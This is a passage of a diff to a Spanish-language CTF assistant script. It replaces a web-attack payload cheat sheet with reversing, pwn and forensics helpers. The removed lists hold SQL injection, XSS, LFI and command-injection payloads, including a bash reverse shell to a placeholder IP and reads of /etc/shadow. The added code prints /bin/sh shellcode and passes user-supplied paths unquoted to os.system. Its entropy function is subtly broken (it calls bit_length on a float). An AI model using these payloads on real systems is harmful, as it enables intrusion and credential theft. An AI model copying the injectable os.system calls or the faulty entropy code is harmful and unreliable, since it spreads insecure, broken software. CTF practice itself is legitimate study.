@@ -1,529 +1,592 @@
-# ctfassistant/main.py - Versión 5.1 (Inyección Masiva)
-# -*- coding: utf-8 -*-
+#!/usr/bin/env python3
+"""
+MÓDULO COMPLETO CTF - Todas las Categorías
+Campo de Marte 2025
+Incluye: Reversing, Pwn, Crypto, Forensics, Steganography, OSINT, Web, Hardware
+"""
 
+import os
 import sys
-import requests
-import urllib.parse
-import base64
-import hashlib
-import json
-import binascii
-import re
-from typing import Dict, List, Any
+import subprocess
+import struct
+import string
+from pathlib import Path
 
-class CTFAssistant:
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+BLUE = '\033[94m'
+MAGENTA = '\033[95m'
+CYAN = '\033[96m'
+RESET = '\033[0m'
+
+# ═══════════════════════════════════════════════════════════════
+# MÓDULO 1: REVERSING
+# ═══════════════════════════════════════════════════════════════
+
+def reversing_strings_analysis(binary_path):
+    """Análisis de strings en binario"""
+    print(f"\n{YELLOW}═══ STRING ANALYSIS ═══{RESET}\n")
     
-    def __init__(self):
-        self.payloads = self._load_payloads()
-        
-    def _load_payloads(self) -> Dict[str, Any]:
-        return {
-            "sqli": {
-                "1. Pruebas de Citas/Comentarios (Bypass de Filtros)": [
-                    "' --", "') --", "'; --", '") --', '" --', "') or 1=1 --", 
-                    "' OR '1'='1", "admin' --", 
-                    "admin' or '1'='1'#",
-                    "\\' or 1=1 --",
-                    "admin') union select 1,2,3 --",
-                    "1; SELECT * FROM users; --",
-                    "1' AND 1=1 UNION SELECT null,null,null --",
-                    "1' OR 1=1 -- -",
-                    "1' OR '1' = '1"
-                ],
-                "2. Bypass de Login y Booleanos": [
-                    "admin' OR 1=1#",
-                    "' OR 'a'='a",
-                    "'='",
-                    "' OR 1=1 -- -",
-                    "admin' AND 1=0 UNION SELECT 'admin', 'password'",
-                    "1' XOR 1=1",
-                    "1' or 1=1 limit 1 --",
-                    "1' OR 1 GROUP BY 'a' HAVING 'a'='a"
-                ],
-                "3. Extracción de Datos y Versión (MySQL)": [
-                    " ORDER BY N --",
-                    " UNION SELECT 1,2,3... --",
-                    " UNION SELECT 1, database(), user() --",
-                    " UNION SELECT 1, @@version, 3 --",
-                    " UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata --",
-                    " UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='NOMBRE_DB' --",
-                    " UNION SELECT 1, group_concat(column_name, 0x3a, table_name), 3 FROM information_schema.columns WHERE table_name='NOMBRE_TABLA' --",
-                    " 1' AND substring(@@version,1,1)='5' -- -",
-                    " 1 AND 1=1 AND 1=1"
-                ],
-                "4. SQLi Tiempos (Time-Based Blind)": [
-                    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'='1",
-                    "' AND IF(1=1, SLEEP(5), 0) --",
-                    "1 OR (SELECT(CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END))"
-                ]
-            },
-            "command_injection": {
-                "1. Separadores y Encadenamiento Común": ["&", "&&", "|", ";", "\n", "%0a", "%0d", "$()"],
-                "2. Pruebas de Ejecución (Linux)": [
-                    "TARGET; ls -la", "TARGET && cat /etc/passwd", "`whoami`", 
-                    "TARGET%0als -la", "TARGET|/bin/bash -c 'ls /'", 
-                    "TARGET; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1 # (Reverse Shell)",
-                    "TARGET| awk 'BEGIN {system(\"whoami\")}'",
-                    "TARGET%0a cat /etc/shadow",
-                    "$(id)",
-                    "TARGET; export PATH=/usr/bin:$PATH; bash"
-                ],
-                "3. Bypass de Filtros (Strings y Wildcards)": [
-                    "TARGET; echo 'pwned' > pwned.txt",
-                    "TARGET; cat /etc/pass*d",
-                    "TARGET; w'h'o'a'm'i",
-                    "TARGET; /???/??? /???/p?ss?d"
-                ],
-                "4. Pruebas en Windows": [
-                    "TARGET& ping 127.0.0.1",
-                    "TARGET & whoami",
-                    "TARGET | type C:\\Windows\\win.ini"
-                ]
-            },
-            "xss": {
-                "1. Básico y Tags de Imagen/SVG": [
-                    "<script>alert(document.domain)</script>",
-                    "<img src=x onerror=alert(1)>",
-                    "<svg onload=alert(1)>",
-                    "<body onpageshow=alert(1)>",
-                    "<details open ontoggle=alert(1)>",
-                    "<iframe src=javascript:alert(1)></iframe>"
-                ],
-                "2. Bypass de Filtros y Codificación": [
-                    "';alert(1)//", "')alert(1)//", 
-                    "\'\"-alert(1)-\'\"`",
-                    "xss<script>/* no spaces */alert(1)</script>",
-                    "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
-                    "<img/src=\"x\"onerror=\"alert(1)\">"
-                ],
-                "3. Event Handlers Avanzados": [
-                    "<a href=\"javascript:alert(1)\">ClickMe</a>",
-                    "<input onfocus=alert(1) autofocus>",
-                    "<video src=x onerror=alert(1)>",
-                    "<isindex action=javascript:alert(1) type=image>",
-                    "<marquee onstart=alert(1)>"
-                ],
-                "4. XSS Reflejado en API/JSON": [
-                    '"}))</script><script>alert(1)</script>',
-                    "';-alert(1)//",
-                    "';}}}</script><svg onload=alert(1)//"
-                ]
-            },
-            "lfi": {
-                "1. Archivos Críticos (Linux)": [
-                    "../../../../../etc/passwd", 
-                    "../../../../../etc/shadow", 
-                    "../../../../../proc/self/environ",
-                    "../../../../../proc/self/cmdline",
-                    "../../../../../var/log/apache2/access.log",
-                    "../../../../../var/log/apache/access.log"
-                ],
-                "2. Wrappers y Encoding Avanzado": [
-                    r"..\..\..\..\windows\system32\drivers\etc\hosts",
-                    "php://filter/read=convert.base64-encode/resource=index.php", 
-                    "php://input",
-                    "data:text/plain,<?php system('id'); ?>",
-                    "....//....//....//....//etc/passwd",
-                    "/etc/passwd%00"
-                ]
-            },
-            "authz": {
-                "1. Controles de Acceso (IDOR)": [
-                    "Cambia id=1 por id=2 o id=admin",
-                    "Modifica user_id de tu cookie/token a user_id:1 (admin)",
-                    "Cambia /api/v1/user/me por /api/v1/user/1"
-                ],
-                "2. Bypass de Lógica/Flujo": [
-                    "Omite un paso de multi-paso (ej: eliminar el parámetro 'step=2')",
-                    "Reenvía la respuesta de la función 'disable_account()' como true/1",
-                    "Fuerza navegación a 'admin.php' directamente."
-                ],
-                "3. Ataques a Sesión (CSRF / Fijación)": [
-                    "Busca tokens CSRF en formularios y reúsalo o elimínalo.",
-                    "Intenta la petición POST/PUT sin el encabezado 'Referer'."
-                ]
-            },
-            "logic_fuzz": {
-                "1. Fuzzing Básico de Parámetros": [
-                    "'", '"', '`', '\\', ';', '|', '&', '>', '<', '*', '..%2f',
-                    '0', '1', '-1', 'true', 'false', 'admin', 'root'
-                ],
-                "2. Headers Fuzzing": [
-                    "X-Forwarded-For: 127.0.0.1",
-                    "X-Original-URL: /admin",
-                    "Referer: https://malicious.com",
-                    "Host: 127.0.0.1"
-                ]
-            },
-            "serialization": {
-                "1. PHP Object Injection (Explotación)": [
-                    'O:7:"MyClass":1:{s:8:"username";s:5:"admin";}',
-                    'a:2:{i:0;s:11:"admin";i:1;s:8:"password";}'
-                ],
-                "2. JSON Deserialization (Payloads clave)": [
-                    '{"$type":"Gadget_Chain, Assembly"}',
-                    '{"username":"admin", "isAdmin":true}',
-                    '{"__proto__": {"isAdmin": true}}'
-                ]
-            }
-        }
+    if not os.path.exists(binary_path):
+        print(f"{RED}❌ Archivo no encontrado{RESET}")
+        return
+    
+    print("[1/4] Extrayendo strings...")
+    os.system(f"strings {binary_path} > /tmp/strings_output.txt")
+    
+    print("\n[2/4] Buscando flags...")
+    os.system(f"grep -i 'flag\\|password\\|key' /tmp/strings_output.txt")
+    
+    print("\n[3/4] Buscando URLs y emails...")
+    os.system(f"grep -E 'http|@' /tmp/strings_output.txt")
+    
+    print("\n[4/4] Strings interesantes (más de 20 chars)...")
+    os.system(f"strings {binary_path} | awk 'length>20' | head -20")
+    
+    print(f"\n💾 Output completo: /tmp/strings_output.txt")
 
-    def show_payloads(self, type: str):
-        map_titles = {
-            "sqli": "[📚] PAYLOADS DE SQL INJECTION AVANZADOS [📚]",
-            "command_injection": "[📚] PAYLOADS DE COMMAND INJECTION (LINUX/WINDOWS) [📚]",
-            "xss": "[📚] PAYLOADS DE XSS Y MANIPULACIÓN DE APIs [📚]",
-            "lfi": "[📚] PAYLOADS DE LFI / PATH TRAVERSAL [📚]",
-            "authz": "[📚] PAYLOADS DE AUTORIZACIÓN Y SESIÓN [📚]",
-            "logic_fuzz": "[📚] FUZZING BÁSICO DE LÓGICA Y HEADERS [📚]",
-            "serialization": "[📚] SERIALIZACIÓN Y LÓGICA DE NEGOCIO [📚]"
+def reversing_binary_info(binary_path):
+    """Información del binario"""
+    print(f"\n{YELLOW}═══ BINARY ANALYSIS ═══{RESET}\n")
+    
+    if not os.path.exists(binary_path):
+        print(f"{RED}❌ Archivo no encontrado{RESET}")
+        return
+    
+    print("[1/5] File type...")
+    os.system(f"file {binary_path}")
+    
+    print("\n[2/5] File size and permissions...")
+    os.system(f"ls -lh {binary_path}")
+    
+    print("\n[3/5] Checksums...")
+    os.system(f"md5sum {binary_path}")
+    os.system(f"sha256sum {binary_path}")
+    
+    print("\n[4/5] Binary protections (checksec)...")
+    os.system(f"checksec --file={binary_path} 2>/dev/null || echo 'checksec no disponible'")
+    
+    print("\n[5/5] Symbols...")
+    os.system(f"nm {binary_path} 2>/dev/null | head -20")
+
+def reversing_disassemble(binary_path):
+    """Desensamblado básico"""
+    print(f"\n{YELLOW}═══ DISASSEMBLY ═══{RESET}\n")
+    
+    if not os.path.exists(binary_path):
+        print(f"{RED}❌ Archivo no encontrado{RESET}")
+        return
+    
+    print("[1/3] Usando objdump...")
+    os.system(f"objdump -d {binary_path} > /tmp/disasm.txt 2>/dev/null")
+    os.system(f"objdump -d {binary_path} | grep -A 10 '<main>' 2>/dev/null")
+    
+    print("\n[2/3] Buscando funciones interesantes...")
+    os.system(f"objdump -t {binary_path} 2>/dev/null | grep -E 'flag|password|key|secret'")
+    
+    print("\n[3/3] Secciones del binario...")
+    os.system(f"readelf -S {binary_path} 2>/dev/null | head -20")
+    
+    print(f"\n💾 Desensamblado completo: /tmp/disasm.txt")
+
+def reversing_hex_dump(binary_path):
+    """Hex dump y búsqueda de patrones"""
+    print(f"\n{YELLOW}═══ HEX DUMP ANALYSIS ═══{RESET}\n")
+    
+    if not os.path.exists(binary_path):
+        print(f"{RED}❌ Archivo no encontrado{RESET}")
+        return
+    
+    print("[1/3] Primeros 256 bytes...")
+    os.system(f"xxd {binary_path} | head -16")
+    
+    print("\n[2/3] Buscando magic bytes conocidos...")
+    with open(binary_path, 'rb') as f:
+        header = f.read(16)
+        hex_header = header.hex()
+        
+        magic_bytes = {
+            '7f454c46': 'ELF Binary',
+            '4d5a': 'Windows PE',
+            '504b0304': 'ZIP Archive',
+            '89504e47': 'PNG Image',
+            'ffd8ffe0': 'JPEG Image',
+            '25504446': 'PDF Document',
+            '1f8b': 'GZIP Compressed'
         }
         
-        print(f"\n{map_titles.get(type, '[📚] PAYLOADS [📚]')}")
-        print("-" * 50)
-        
-        for category, payload_list in self.payloads[type].items():
-            print(f"**{category}**")
-            for p in payload_list:
-                print(f"   -> {p}")
-            print("-" * 15)
+        for magic, desc in magic_bytes.items():
+            if hex_header.startswith(magic):
+                print(f"✅ Detectado: {desc}")
+    
+    print("\n[3/3] Últimos 256 bytes (puede haber data al final)...")
+    os.system(f"xxd {binary_path} | tail -16")
 
-    def tool_sqli(self):
-        print("\n[🛠️] Módulo: SQL Injection (SQLi)")
-        target_url = input("URL objetivo (ej: http://e.com/page.php?id=1): ")
-        self.show_payloads("sqli")
-        input("\n[✅] Análisis de SQLi completado. Presiona ENTER para volver al menú...")
+def reversing_ltrace_strace(binary_path):
+    """Trazado de llamadas"""
+    print(f"\n{YELLOW}═══ DYNAMIC ANALYSIS ═══{RESET}\n")
+    
+    print("[1/2] ltrace (library calls)...")
+    print("Ejecutando binario con ltrace...")
+    os.system(f"timeout 5 ltrace {binary_path} 2>&1 | head -30")
+    
+    print("\n[2/2] strace (system calls)...")
+    print("Ejecutando binario con strace...")
+    os.system(f"timeout 5 strace {binary_path} 2>&1 | head -30")
 
-    def tool_command_injection(self):
-        print("\n[🛠️] Módulo: Command Injection")
-        target_url = input("URL objetivo (ej: http://e.com/ping.php?host=127.0.0.1): ")
-        self.show_payloads("command_injection")
-        input("\n[✅] Análisis de Command Injection completado. Presiona ENTER para volver al menú...")
-
-    def tool_xss(self):
-        print("\n[🛠️] Módulo: XSS Payload Generator & Tester")
-        target_url = input("URL objetivo (ej: http://e.com/search.php?q=TEST): ")
-        self.show_payloads("xss")
-        input("\n[✅] Análisis de XSS completado. Presiona ENTER para volver al menú...")
+def reversing_menu():
+    """Menú de Reversing"""
+    while True:
+        print(f"\n{BLUE}{'═'*60}")
+        print("REVERSING ENGINEERING")
+        print(f"{'═'*60}{RESET}")
+        print("1. 📝 String Analysis")
+        print("2. 🔍 Binary Info (file, checksec, symbols)")
+        print("3. 💻 Disassembly (objdump)")
+        print("4. 🔢 Hex Dump Analysis")
+        print("5. 🔬 Dynamic Analysis (ltrace/strace)")
+        print("6. 🛠️  Abrir en Ghidra")
+        print("7. 🛠️  Abrir en radare2")
+        print("8. 📦 Análisis Completo (todo lo anterior)")
+        print("9. ← Volver")
         
-    def tool_lfi(self):
-        print("\n[🛠️] Módulo: LFI / Path Traversal (Ing. Inversa)")
-        target_url = input("URL objetivo (ej: http://e.com/page.php?file=index.php): ")
-        self.show_payloads("lfi")
-        input("\n[✅] Análisis de LFI completado. Presiona ENTER para volver al menú...")
-
-    def tool_authz(self):
-        print("\n[🛠️] Módulo: Autenticación, Autorización y Sesiones")
-        print("--------------------------------------------------")
-        print("💡 **Objetivo:** Enfócate en cambiar parámetros de usuario y roles en peticiones.")
+        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
         
-        self.show_payloads("authz")
+        if choice == '9':
+            break
         
-        print("\n[🔍] Puntos Clave para Ataques a Sesión/Autorización:")
-        print("  - **IDOR:** Busca cambiar ID's en URL, JSON o Parámetros.")
-        print("  - **CSRF:** Examina si la petición POST/PUT requiere un token secreto. Si no lo requiere, es vulnerable.")
-        print("  - **Escalada:** Intenta cambiar el valor de tu rol ('user' a 'admin') en cookies o payloads de POST/JSON.")
-        
-        input("\n[✅] Análisis de Autorización/Sesiones completado. Presiona ENTER para volver al menú...")
-
-    def tool_logic_analysis(self):
-        while True:
-            print("\n╔══════════════════════════════════════════╗")
-            print("║ [4.1] LÓGICA DE NEGOCIO Y SERIALIZACIÓN  ║")
-            print("╠══════════════════════════════════════════╣")
-            print("║ 1. Payloads de Serialización (PHP, JSON) ║")
-            print("║ 2. Fuzzing Básico (Parámetros/Headers)   ║")
-            print("║ 9. Volver al Menú Principal              ║")
-            print("╚══════════════════════════════════════════╝")
-            
-            choice = input("Selecciona una opción: ")
+        if choice in ['1', '2', '3', '4', '5', '8']:
+            binary = input("Ruta del binario: ").strip()
             
             if choice == '1':
-                self.show_payloads("serialization")
-                print("\n💡 **Punto Clave:** Estos payloads se inyectan en cookies, parámetros de POST o archivos que se serializan/deserializan.")
-                input("\n[✅] Análisis de Serialización completado. Presiona ENTER para continuar...")
+                reversing_strings_analysis(binary)
             elif choice == '2':
-                self.show_payloads("logic_fuzz")
-                print("\n💡 **Punto Clave:** Prueba estos valores en todos los parámetros, incluyendo los ocultos, cookies y encabezados HTTP.")
-                input("\n[✅] Análisis de Fuzzing completado. Presiona ENTER para continuar...")
-            elif choice == '9':
-                break
-            else:
-                print("Opción no válida. Inténtalo de nuevo.")
-
-
-    def tool_crypto_analysis(self):
-        while True:
-            print("\n╔══════════════════════════════════════════╗")
-            print("║   [3.2] MENÚ DE CRIPTOGRAFÍA AVANZADA    ║")
-            print("╠══════════════════════════════════════════╣")
-            print("║ 1. Analizador de Cadenas (Base64, Hex, JWT)║")
-            print("║ 2. Generador de Bloques (Padding Oracle) ║")
-            print("║ 9. Volver al Menú Anterior               ║")
-            print("╚══════════════════════════════════════════╝")
-            
-            choice = input("Selecciona una opción: ")
-            
-            if choice == '1':
-                self._analyzer_crypto_string()
-            elif choice == '2':
-                self._tool_padding_generator()
-            elif choice == '9':
-                break
-            else:
-                print("Opción no válida. Inténtalo de nuevo.")
-
-
-    def _analyzer_crypto_string(self):
-        print("\n[🛠️] Analizador de Cadenas (Codificación y Hashing)")
-        print("-----------------------------------------------------")
-        data = input("Ingresa la cadena a analizar (Ej: Hex, Base64, JWT): ").strip()
-
-        if not data:
-            print("❌ Entrada vacía.")
-            return
-
-        print("\n[🔍] Resultados de Análisis:")
-        
-        if data.count('.') == 2:
-            print("=" * 50)
-            print("[🔑] Token JWT Detectado:")
-            try:
-                header_b64, payload_b64, signature = data.split('.')
-                
-                header_json = base64.urlsafe_b64decode(header_b64 + '==').decode('utf-8', errors='ignore')
-                payload_json = base64.urlsafe_b64decode(payload_b64 + '==').decode('utf-8', errors='ignore')
-                
-                print(f"   -> HEADER: {json.dumps(json.loads(header_json), indent=2)}")
-                print(f"   -> PAYLOAD: {json.dumps(json.loads(payload_json), indent=2)}")
-                print(f"   -> FIRMA: {signature}")
-                print("\n   💡 **Ataques JWT Clave:** 1. Cambiar 'alg' a 'none'. 2. Modificar el PAYLOAD.")
-            except Exception:
-                print(f"   ❌ No es un JWT decodificable.")
-            print("=" * 50)
-        
-        try:
-            decoded_b64 = base64.b64decode(data).decode('utf-8', errors='ignore')
-            if len(data) > 10 and len(decoded_b64) < len(data) * 0.9:
-                 print(f"[*] Base64 Decodificado: {decoded_b64[:100]}{'...' if len(decoded_b64) > 100 else ''}")
-        except:
-            pass
-            
-        decoded_url = urllib.parse.unquote(data)
-        if decoded_url != data:
-            print(f"[*] URL Decodificado: {decoded_url}")
-
-        if all(c in '0123456789abcdefABCDEF' for c in data) and len(data) % 2 == 0:
-             try:
-                decoded_hex = binascii.unhexlify(data).decode('utf-8', errors='ignore')
-                print(f"[*] Hex Decodificado: {decoded_hex[:100]}{'...' if len(decoded_hex) > 100 else ''}")
-             except binascii.Error:
-                 pass
-        
-        try:
-            decoded_b85 = base64.a85decode(data.encode('ascii')).decode('utf-8', errors='ignore')
-            if len(data) > 10 and len(decoded_b85) < len(data) * 0.9:
-                 print(f"[*] Base85 Decodificado: {decoded_b85[:100]}{'...' if len(decoded_b85) > 100 else ''}")
-        except:
-             pass
-
-        print("\n[🔐] Hashing:")
-        print(f"   -> MD5: {hashlib.md5(data.encode()).hexdigest()}")
-        print(f"   -> SHA256: {hashlib.sha256(data.encode()).hexdigest()}")
-        
-        input("\n[✅] Análisis completado. Presiona ENTER para continuar...")
-
-    def _tool_padding_generator(self):
-        print("\n[🛠️] Generador de Bloques (Padding Oracle - AES-CBC)")
-        print("-------------------------------------------------------")
-        
-        ciphertext = input("Ingresa el Ciphertext (en Hex) o Base64: ").strip()
-        block_size_str = input("Ingresa el tamaño del bloque (Típicamente 16 para AES): ").strip()
-        
-        try:
-            block_size = int(block_size_str)
-        except ValueError:
-            print("❌ El tamaño del bloque debe ser un número entero.")
-            return
-
-        try:
-            if all(c in '0123456789abcdefABCDEF' for c in ciphertext) and len(ciphertext) % 2 == 0:
-                cipher_bytes = binascii.unhexlify(ciphertext)
-            else:
-                cipher_bytes = base64.b64decode(ciphertext)
-        except Exception:
-            print("❌ Error al decodificar: Ingresa Hex o Base64 válido.")
-            return
-
-        print(f"\n[🔍] Análisis de Bloques (Tamaño: {block_size} bytes):")
-        
-        if len(cipher_bytes) % block_size != 0:
-            print(f"⚠️ Advertencia: El tamaño de los datos ({len(cipher_bytes)} bytes) no es un múltiplo del tamaño del bloque ({block_size} bytes).")
-            return
-            
-        blocks = [cipher_bytes[i:i + block_size] for i in range(0, len(cipher_bytes), block_size)]
-
-        print(f"[*] Número de Bloques Detectados: {len(blocks)}")
-        
-        for i, block in enumerate(blocks):
-            print(f"   -> Bloque {i}: {block.hex()} (Tamaño: {len(block)})")
-
-        if len(blocks) >= 2:
-            print("\n[💡] **Para Ataques Padding Oracle (AES-CBC):**")
-            print("   - El primer bloque es el **IV (Vector de Inicialización)**.")
-            print(f"\n[*] IV (Bloque 0): {blocks[0].hex()}")
-            print(f"[*] C1 (Bloque 1): {blocks[1].hex()}")
-            
-            padding_byte = bytes([1]) * block_size
-            print("\n[🛠️] Bloque de Manipulación Útil (Un Byte de Padding):")
-            print(f"   - Bloque de 1 byte de padding: {padding_byte.hex()}")
-            print("   - **Usa este bloque y XORéalo con el IV para manipular el último byte del texto plano.**")
-
-        input("\n[✅] Generador de Bloques completado. Presiona ENTER para continuar...")
-
-    def tool_recon(self):
-        print("\n[🛠️] Módulo: Reconocimiento (Headers & Tech)")
-        print("---------------------------------------------")
-        target_url = input("Ingresa la URL base (ej: http://ejemplo.com): ")
-        
-        try:
-            response = requests.get(target_url, timeout=5)
-            
-            print(f"\n[🔗] URL Probada: {target_url}")
-            print(f"[*] Código de Estado HTTP: {response.status_code}")
-            
-            print("\n[🔍] Encabezados de Respuesta:")
-            interesting_headers = ["Server", "X-Powered-By", "Content-Type", "Set-Cookie", "Location", "X-Frame-Options", "Content-Security-Policy"]
-            for header in interesting_headers:
-                if header in response.headers:
-                    print(f"   -> {header}: {response.headers[header]}")
-            
-            if response.cookies:
-                print("\n[🍪] Cookies (Sesiones):")
-                for cookie in response.cookies:
-                    print(f"   -> {cookie.name}: {cookie.value}")
-                    if cookie.name.lower() in ['session', 'token', 'jwt']:
-                        print("      💡 Posible token de sesión crítico.")
-
-            techs = []
-            if 'X-Powered-By' in response.headers: techs.append(response.headers['X-Powered-By'])
-            if 'PHPSESSID' in response.cookies: techs.append("PHP")
-            if 'ASP.NET' in response.headers: techs.append("ASP.NET")
-
-            if techs:
-                print(f"\n[💡] Posibles Tecnologías Detectadas: {', '.join(set(techs))}")
-
-        except requests.exceptions.RequestException as e:
-            print(f"❌ Error de conexión: {e}")
-            
-        input("\n[✅] Análisis de Reconocimiento completado. Presiona ENTER para volver al menú...")
-
-    def show_injection_menu(self):
-        while True:
-            print("\n╔══════════════════════════════════════════╗")
-            print("║        [1] MENÚ DE INYECCIÓN             ║")
-            print("╠══════════════════════════════════════════╣")
-            print("║ 1. SQL Injection (SQLi) Tool             ║")
-            print("║ 2. Command Injection Tool                ║") 
-            print("║ 9. Volver al Menú Principal              ║")
-            print("╚══════════════════════════════════════════╝")
-            
-            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
-            
-            if choice == '1':
-                self.tool_sqli()
-            elif choice == '2':
-                self.tool_command_injection()
-            elif choice == '9':
-                break
-            else:
-                print("Opción no válida. Inténtalo de nuevo.")
-
-    def show_security_menu(self):
-        while True:
-            print("\n╔══════════════════════════════════════════╗")
-            print("║     [2] MENÚ DE SEGURIDAD ESPECÍFICA     ║")
-            print("╠══════════════════════════════════════════╣")
-            print("║ 1. XSS Payload Generator                 ║")
-            print("║ 2. LFI / Path Traversal Tool             ║")
-            print("║ 3. Authz & Sesiones (CSRF, IDOR)         ║") 
-            print("║ 9. Volver al Menú Principal              ║")
-            print("╚══════════════════════════════════════════╝")
-            
-            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
-            
-            if choice == '1':
-                self.tool_xss()
-            elif choice == '2':
-                self.tool_lfi()
+                reversing_binary_info(binary)
             elif choice == '3':
-                self.tool_authz()
-            elif choice == '9':
-                break
-            else:
-                print("Opción no válida. Inténtalo de nuevo.")
+                reversing_disassemble(binary)
+            elif choice == '4':
+                reversing_hex_dump(binary)
+            elif choice == '5':
+                reversing_ltrace_strace(binary)
+            elif choice == '8':
+                print(f"\n{GREEN}[*] Ejecutando análisis completo...{RESET}\n")
+                reversing_binary_info(binary)
+                reversing_strings_analysis(binary)
+                reversing_hex_dump(binary)
+                reversing_disassemble(binary)
+                print(f"\n{GREEN}✅ Análisis completo guardado en /tmp/{RESET}")
+        
+        elif choice == '6':
+            binary = input("Ruta del binario: ").strip()
+            print(f"\n{GREEN}[*] Abriendo en Ghidra...{RESET}")
+            os.system(f"ghidra {binary} &")
+        
+        elif choice == '7':
+            binary = input("Ruta del binario: ").strip()
+            print(f"\n{GREEN}[*] Abriendo en radare2...{RESET}")
+            os.system(f"r2 {binary}")
 
-    def show_utilities_menu(self):
-        while True:
-            print("\n╔══════════════════════════════════════════╗")
-            print("║      [3] MENÚ DE UTILIDADES AVANZADAS    ║")
-            print("╠══════════════════════════════════════════╣")
-            print("║ 1. Reconocimiento (Ing. Inversa/Headers) ║")
-            print("║ 2. Criptografía y Tokens                 ║") 
-            print("║ 3. Lógica de Negocio y Serialización     ║")
-            print("║ 9. Volver al Menú Principal              ║")
-            print("╚══════════════════════════════════════════╝")
-            
-            choice = input("Selecciona una opción o (Ctrl+C para salir): ")
+# ═══════════════════════════════════════════════════════════════
+# MÓDULO 2: PWN / BINARY EXPLOITATION
+# ═══════════════════════════════════════════════════════════════
+
+def pwn_checksec(binary_path):
+    """Verificar protecciones del binario"""
+    print(f"\n{YELLOW}═══ SECURITY CHECKS ═══{RESET}\n")
+    os.system(f"checksec --file={binary_path}")
+
+def pwn_buffer_overflow_check(binary_path):
+    """Detectar posibles buffer overflows"""
+    print(f"\n{YELLOW}═══ BUFFER OVERFLOW DETECTION ═══{RESET}\n")
+    
+    print("[1/3] Buscando funciones peligrosas...")
+    dangerous_funcs = ['gets', 'strcpy', 'sprintf', 'scanf', 'vsprintf']
+    
+    for func in dangerous_funcs:
+        result = subprocess.run(
+            f"objdump -d {binary_path} | grep -i {func}",
+            shell=True,
+            capture_output=True,
+            text=True
+        )
+        if result.stdout:
+            print(f"⚠️  Encontrado: {func}")
+    
+    print("\n[2/3] Verificando stack protections...")
+    os.system(f"readelf -s {binary_path} | grep STACK")
+    
+    print("\n[3/3] Generando pattern para testing...")
+    print("Pattern cíclico (100 chars):")
+    # Generar pattern De Bruijn simple
+    pattern = ""
+    for i in range(26):
+        for j in range(26):
+            pattern += chr(65 + i) + chr(97 + j)
+            if len(pattern) >= 100:
+                break
+        if len(pattern) >= 100:
+            break
+    print(pattern[:100])
+
+def pwn_rop_gadgets(binary_path):
+    """Buscar ROP gadgets"""
+    print(f"\n{YELLOW}═══ ROP GADGETS ═══{RESET}\n")
+    print("Buscando gadgets útiles...")
+    os.system(f"ROPgadget --binary {binary_path} 2>/dev/null | head -50")
+
+def pwn_menu():
+    """Menú de PWN"""
+    while True:
+        print(f"\n{BLUE}{'═'*60}")
+        print("PWN / BINARY EXPLOITATION")
+        print(f"{'═'*60}{RESET}")
+        print("1. 🛡️  Check Security (checksec)")
+        print("2. 💥 Buffer Overflow Detection")
+        print("3. 🔗 ROP Gadgets Search")
+        print("4. 📝 Generate Shellcode")
+        print("5. 🔢 Generate Cyclic Pattern")
+        print("9. ← Volver")
+        
+        choice = input(f"\n{CYAN}Opción: {RESET}").strip()
+        
+        if choice == '9':
+            break
+        
+        if choice in ['1', '2', '3']:
+            binary = input("Ruta del binario: ").strip()
             
             if choice == '1':
-                self.tool_recon()
+                pwn_checksec(binary)
             elif choice == '2':
-                self.tool_crypto_analysis()
+                pwn_buffer_overflow_check(binary)
             elif choice == '3':
-                self.tool_logic_analysis()
-            elif choice == '9':
-                break
-            else:
-                print("Opción no válida. Inténtalo de nuevo.")
+                pwn_rop_gadgets(binary)
+        
+        elif choice == '4':
+            print("\n🔧 Shellcode común:\n")
+            print("Linux x86 execve /bin/sh:")
+            print("\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e")
+            print("\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80")
+        
+        elif choice == '5':
+            length = input("Longitud del pattern (default 100): ").strip() or "100"
+            pattern = ""
+            for i in range(26):
+                for j in range(26):
+                    pattern += chr(65 + i) + chr(97 + j)
+                    if len(pattern) >= int(length):
+                        break
+                if len(pattern) >= int(length):
+                    break
+            print(f"\nPattern: {pattern[:int(length)]}")
 
-    def main_menu(self):
-        while True:
-            try:
-                print("\n╔══════════════════════════════════════════╗")
-                print("║     [🔥] CTF WEB ASSISTANT V5.1 [🔥]     ║")
-                print("╠══════════════════════════════════════════╣")
-                print("║ 1. Ataques de Inyección (SQLi, Command)  ║")
-                print("║ 2. Seguridad Específica (XSS, LFI, AuthZ)║")
-                print("║ 3. Utilidades Avanzadas (Recon, Crypto, Lógica)║")
-                print("║ 4. Salir (Ctrl+C también funciona)       ║")
-                print("╚══════════════════════════════════════════╝")
+# ═══════════════════════════════════════════════════════════════
+# MÓDULO 3: FORENSICS
+# ═══════════════════════════════════════════════════════════════
+
+def forensics_file_analysis(file_path):
+    """Análisis forense de archivo"""
+    print(f"\n{YELLOW}═══ FILE FORENSICS ═══{RESET}\n")
+    
+    print("[1/6] File type and magic bytes...")
+    os.system(f"file {file_path}")
+    os.system(f"xxd {file_path} | head -3")
+    
+    print("\n[2/6] Metadata (exiftool)...")
+    os.system(f"exiftool {file_path} 2>/dev/null || echo 'exiftool no disponible'")
+    
+    print("\n[3/6] Binwalk (embedded files)...")
+    os.system(f"binwalk {file_path}")
+    
+    print("\n[4/6] Foremost (file carving)...")
+    output_dir = "/tmp/foremost_output"
+    os.system(f"foremost -o {output_dir} {file_path} 2>/dev/null")
+    print(f"Archivos extraídos en: {output_dir}")
+    
+    print("\n[5/6] Strings analysis...")
+    os.system(f"strings {file_path} | grep -i flag")
+    
+    print("\n[6/6] Entropy check (detectar encriptación)...")
+    try:
+        with open(file_path, 'rb') as f:
+            data = f.read()
+            if len(data) > 0:
+                byte_counts = [0] * 256
+                for byte in data:
+                    byte_counts[byte] += 1
                 
-                choice = input("Selecciona una opción: ")
+                entropy = 0
+                for count in byte_counts:
+                    if count > 0:
+                        p = count / len(data)
+                        entropy -= p * (p.bit_length() - 1)
                 
